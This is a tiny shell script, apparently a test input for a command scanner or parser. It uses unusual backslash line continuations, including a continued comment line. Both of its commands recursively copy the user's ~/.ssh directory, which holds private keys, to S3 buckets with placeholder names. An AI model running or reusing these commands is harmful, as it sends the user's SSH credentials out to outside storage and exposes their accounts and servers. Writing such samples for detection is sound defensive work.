#!/bin/sh
aws s3 \
  cp \
  ~/.ssh \
  s3://b/ --recursive
x=1 \
# comment \
aws s3 cp ~/.ssh s3://c/ --recursive
